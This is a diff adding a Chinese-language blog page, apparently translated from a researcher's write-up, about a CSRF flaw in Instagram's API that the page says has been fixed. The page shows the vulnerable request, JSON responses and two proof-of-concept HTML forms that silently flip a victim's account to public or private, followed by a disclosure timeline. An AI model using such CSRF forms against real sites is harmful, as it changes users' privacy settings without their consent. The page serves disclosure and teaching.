@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>走近科学：我是如何入侵Instagram查看你的私人片片的</title>
+        <meta name="viewport" content="width=device-width">
+
+        <!-- syntax highlighting CSS -->
+        <link rel="stylesheet" href="/css/syntax.css">
+
+        <!-- Custom CSS -->
+        <link rel="stylesheet" href="/css/main.css">
+
+        <link href="/css/prettify.css" rel="stylesheet" type="text/css" media="all">
+
+    </head>
+    <body>
+
+        <div id="header" alog-group="log-header">
+          <div class="header-content">
+                
+                <div id="menu"><a href="/">首页</a></div>
+                <div id="usrbar"><a href="http://news.baidu.com">百度新闻</a>|<a href="http://www.baidu.com">百度首页</a></div>
+                <div class="top-main"><h1 class="title"><a href="/">LubyRuffy的天上人间</a></h1></div>
+          </div>  
+        </div>
+
+        <div class="clearfix" id="body">
+          <div class="l-main-col">
+            
+
+            <div id="page">
+	<h2>走近科学：我是如何入侵Instagram查看你的私人片片的</h2>
+	<p class="meta">2014-02-27</p>
+
+	<div class="post">
+	        <p></p>
+<p style="text-align: center;"><span style="color: rgb(0, 176, 80);"><strong><img data-original="/imgs/e68582ffa9b61ec40746654b51e61e06.jpg!small" src="/imgs/e68582ffa9b61ec40746654b51e61e06.jpg!small" title="1.jpg"></strong></span></p>
+<noscript><img src="/imgs/e68582ffa9b61ec40746654b51e61e06.jpg!small" title="1.jpg"></noscript>
+<p><span style="color: rgb(0, 176, 80);"><strong>在这篇文章中，我想介绍几个月前我在Instagram站点和移动应用中发现的一个漏洞（现在已被修复好了）。</strong></span></p>
+<p><strong>Instagram又是什么？</strong></p>
+<p>维基百科这样介绍：</p>
+<pre class="prettyprint lang-html">“Instagram是一个在线图片分享、视频共享和社交网络服务的网站，允许用户将拍摄的照片和视频，通过应用数字滤波器分享到他们各种各样的社交网络，如Facebook、Twitter、Tumblr和Flickr。 它的一个独特的性质是它将照片规范为正方形形状！像那种类似于柯达傻瓜相机(Kodak Instamatic)和宝丽莱（Polaroid）照片。与宽高16:9的现在通常使用的移动相机形成鲜明对比。 同时，用户也能够记录和分享持续15秒的短视频。”</pre>
+<p><strong>总结：</strong></p>
+<h3></h3>
+<p>Instagram的API某些行为容易受到跨站点伪造请求（<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">CSRF </a>)攻击。 攻击者可以执行用户(受害者)在web应用程序正在进行的身份验证。 一个成功的CSRF利用可以通过他的Instagram文件弄到到用户的个人数据(如照片和个人信息)。</p>
+<p><strong>介绍：</strong></p>
+<h3></h3>
+<p>几个月前，我在Instagram的平台寻找它的安全漏洞。我猜测网站已经被审核了，是安全的。所以我把我努力的重点放在了Instagram的移动应用程序中(iOS和Android)。</p>
+<p>首先，我把抓取的所有资源用来检测并寻找应用程序的新的攻击点，还测试了典型的安全漏洞，像跨站点脚本或代码注入，但是这一次，我没有发现任何空点来允许我注入代码（TT）。</p>
+<p>我研究的第二步是通过站点比较两个移动应用(Android和iOS)，以便找到不同的请求和行为，通过两者互换利用。</p>
+<p>经过整个站点的勘测后，我意识到，与移动应用程序不同的是，在网站上用户不能改变他的个人资料的隐私。</p>
+<p>下面图片显示的是我指的差异：</p>
+<p style="text-align: center;"><img src="/imgs/fbb75184af1b34970f99675724541a17.png!small" style="width: 550px; height: 873px;" title="01.png" data_ue_data-original="/imgs/fbb75184af1b34970f99675724541a17.png!small" width="550" height="873" border="0" hspace="0" vspace="0"></p>
+<noscript><img src="/imgs/fbb75184af1b34970f99675724541a17.png!small" style="width: 550px; height: 873px;" title="01.png" data_ue_src="/imgs/fbb75184af1b34970f99675724541a17.png!small" width="550" height="873" border="0" hspace="0" vspace="0"></noscript>
+<p style="text-align: center;"><img src="/imgs/7328d399bd16518bcf53129e9b1ff5fd.png!small" style="width: 550px; height: 385px;" title="02.png" data_ue_data-original="/imgs/7328d399bd16518bcf53129e9b1ff5fd.png!small" width="550" height="385" border="0" hspace="0" vspace="0"></p>
+<noscript><img src="/imgs/7328d399bd16518bcf53129e9b1ff5fd.png!small" style="width: 550px; height: 385px;" title="02.png" data_ue_src="/imgs/7328d399bd16518bcf53129e9b1ff5fd.png!small" width="550" height="385" border="0" hspace="0" vspace="0"></noscript>
+<h3>它是如何工作的?</h3>
+<p>我集中我的精力在Android应用程序的这一部分，我决定研究如何请求用户公开他的个人资料。 这个请求是:</p>
+<pre class="prettyprint lang-html">POST /api/v1/accounts/set_public/ HTTP/1.1
+Host: instagram.com
+User-Agent: Instagram 5.0.6 Android (19/4.4.2; 213dpi; 800x1205;
+asus/google; Nexus 7; grouper; grouper; en_US)</pre>
+<p>和它的JSON响应:</p>
+<pre class="prettyprint lang-html">{"status":"ok","user{"username":"phr0nak","profile_pic_url":"
+http:\/\/images.ak.instagram.com\/profiles\/profile_1241468
+1_75sq_1320360563.jpg","biography":"","full_name":"Christian",
+"pk":12414681,"is_private":false,"external_url":"http:\/\/insertco.in"}}</pre>
+<p>正如你可能已经注意到了，在过去的用户请求中，移动应用程序不使用任何像秘密安全令牌机制一样的东西防止像CSRF类的攻击。</p>
+<p>重要的是，由于没有很多可以使用空间，利用跨站点伪造对移动应用程序的请求是非常困难的。 </p>
+<p>又因为在我的测试中我意识到，Instagram的API没有控制用户在set_public 和 set_private 实现和行为中的用户代理请求。出于这个原因，我决定测试web应用程序这个潜在的弱点，</p>
+<p> 接下来，我要做的是编写一个简单的CSRF理念的验证，如下：</p>
+<pre class="prettyprint lang-html"> &lt;html&gt; 
+   &lt;body&gt; 
+      &lt;form action= "http://instagram.com/api/v1/accounts/set_public
+/" method= "POST" &gt; 
+       &lt;input type= "submit" value= "Submit form" /&gt; 
+    &lt;/form&gt; 
+   &lt;/body&gt;
+ &lt;/html&gt;</pre>
+<p>理念验证已准备好了，我测试它对另一个私人用户配置文件。 我吃惊的是当我看到用户请求正常工作时，我确定CSRF攻击完全成功了！用户的配置文件被设置为公开了。</p>
+<p>这理念证明的先前反应是：</p>
+<pre class="prettyprint lang-html">{"status":"ok","user{"username":"phr0nak","profile_pic_url":"
+http:\/\/images.ak.instagram.com\/profiles\/profile_1241468
+1_75sq_1320360563.jpg","biography":"","full_name":"Christian",
+"pk":12414681,"is_private":false,"external_url":"http:\/\/insertco.in"}}</pre>
+<p>在这一点上，我可以通过点击我的CSRF负载将任何一个受害者Instagram用户配置文件设置为公开。 但我想要更多，所以我使用同样的方法将它设置为私有的配置文件。</p>
+<p>使用前面的理念验证，只改变来自 set_public 和 set_private 的URL活动，我就可以将任何用户配置的文件设为私有。</p>
+<pre class="prettyprint lang-html"> &lt;html&gt; 
+     &lt;body&gt;
+        &lt;form action= "http://instagram.com/api/v1/accounts/set_private
+/" method= "POST" &gt; 
+             &lt;input type= "submit" value= "Submit form" /&gt;
+         &lt;/form&gt; 
+      &lt;/body&gt;
+ &lt;/html&gt;</pre>
+<p><br></p>
+<p>反回是：</p>
+<pre class="prettyprint lang-html">{"status":"ok","user{"username":"phr0nak","profile_pic_url":"
+http:\/\/images.ak.instagram.com\/profiles\/profile_1241468
+1_75sq_1320360563.jpg","biography":"","full_name":"Christian",
+"pk":12414681,"is_private":true,"external_url":"http:\/\/insertco.in"}}</pre>
+<p>鉴于Instagram没有使用任何安全机制来阻止CSRF攻击，有可能利用这些简单的概念来改变任何受害者的用户隐私。</p>
+<p>重要的是，由于Instagram没有使用csrf全令牌，也没有检测是否来自移动应用的代理请求。不得不再次提到该漏洞完全可以在一个真实的场景(web应用程序)中被利用。</p>
+<h3>INSTAGRAM / FACEBOOK如何处理这个问题呢?</h3>
+<p>不幸的是，在使用Web API的现有的移动应用程序中实现CSRF非常不容易的，因为应用程序有旧客户端没有发送正确的验证，这是不会立即锁定的重要原因。</p>
+<p>但是从现在起，所有新会话在登陆的时候会区分移动客户端和web端。以便网络会话可以完全启用CSRF保护，移动端的会话也会有一个秘密安全令牌。</p>
+<p>所以，此刻，任何一个试图调用的API只允许用于移动应用响应此请求的将是一个结果：</p>
+<pre class="prettyprint lang-html">{"status":"fail","message":"login_required”}</pre>
+<p>披露时间表</p>
+<pre class="prettyprint lang-html">2013年8月22日：理念证明被发送到Facebook的初次报告。
+2013年8月28日：Facebook上获悉，该漏洞已通知到Instagram的开发团队。
+2013年9月6日：来自Facebook的响应，要求确认该问题已得到解决。
+2013年9月6日，得到Facebook回复，确认修复。
+2013年9月16日，Facebook的新报告，理念验证绕过去的初始定位。
+二○一三年九月三十零日：来自Facebook的响应，通知有关的bug赏金奖励的详细信息。
+二○一三年十二月十六日：Facebook的发送Bug的赏金奖励。
+2014年1月23日：向Facebook报道一些奇怪的行为，在他们的第二个修正中可能有一个新绕行。
+2014年2月4日：来自Facebook回应，确认申请，终于被正确修补。
+2014年2月4日：报告就此结束。</pre>
+<p><strong>参考</strong></p>
+<p><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;hl=zh-CN&amp;ie=UTF8&amp;prev=_t&amp;rurl=translate.google.com.hk&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.instagram.com/&amp;usg=ALkJrhjlTgF8mOOo4UYAdJJ5X4qUqaW1xw">https://www.instagram.com</a><br><a href="http://translate.googleusercontent.com/translate_c?depth=1&amp;hl=zh-CN&amp;ie=UTF8&amp;prev=_t&amp;rurl=translate.google.com.hk&amp;sl=en&amp;tl=zh-CN&amp;u=http://en.wikipedia.org/wiki/Instagram&amp;usg=ALkJrhiV8gwR2nnXb2tAup1Ph0OB8s3wbw">http://en.wikipedia.org/wiki/Instagram</a><br><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;hl=zh-CN&amp;ie=UTF8&amp;prev=_t&amp;rurl=translate.google.com.hk&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)&amp;usg=ALkJrhjxNejxBDoFiFKb4SvsNxRfjVplGA">https://www.owasp.org/index.php/Cross-Site_Request_Forgery_（CSRF）</a></p>
+<p>[编译自<a href="http://insertco.in/2014/02/10/how-i-hacked-instagram/" target="_self" title="InsertCoin">InsertCoin</a> ]</p>
+
+        <p class="statement">
+
+	</div>
+</div>
+
+
+          </div>
+
+          <div class="l-right-col">
+          </div>
+        </div>
+
+        <div id="footer" alog-group="log-footer">
+          <p class="site-info">
+            <a href="https://github.com/LubyRuffy">github.com/LubyRuffy</a><br />
+            <a href="https://twitter.com/LubyRuffy">twitter.com/LubyRuffy</a><br />
+          </p>
+        </div>
+
+    </body>
+</html>
